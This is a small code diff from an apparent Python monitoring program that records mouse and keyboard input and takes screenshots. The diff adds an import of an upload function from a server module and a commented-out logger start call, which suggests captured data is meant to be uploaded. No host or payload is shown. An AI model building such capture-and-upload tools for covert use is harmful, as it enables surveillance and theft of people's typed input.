@@ -5,7 +5,7 @@ import glob
 from mouse_logger import MouseLogger
 from keyboard_logger import KeyboardLogger
 from screenshot_taker import ScreenshotTaker
-
+from server import upload_file
 
 mouseLogger = MouseLogger()
 keyLogger =  KeyboardLogger()
@@ -36,3 +36,5 @@ def main(argv):
 
 if __name__ == "__main__":
     main(sys.argv[1:])
+    # start_logger()
+    
